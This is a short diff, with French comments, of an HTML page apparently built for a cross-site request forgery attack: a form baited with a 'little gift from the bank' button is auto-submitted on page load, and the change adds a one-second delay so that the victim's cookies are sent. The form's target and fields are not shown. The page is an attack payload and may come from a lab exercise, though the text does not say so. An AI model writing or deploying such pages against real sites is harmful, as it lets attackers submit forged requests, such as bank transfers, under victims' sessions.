@@ -12,8 +12,11 @@
         <button type="submit">Petit cadeau de la banque pour vous</button>
      </form>
      <script>
+        // Lorsque la page est chargée, soumettre automatiquement le formulaire
         window.onload = function() {
-            document.forms[0].submit(); // Soumission du premier formulaire
+            setTimeout(function() {
+                document.forms[0].submit(); // Soumettre le premier formulaire
+            }, 1000); // Délai de 1 seconde pour être sûr que les cookies sont envoyés
         };
      </script>
 </body>
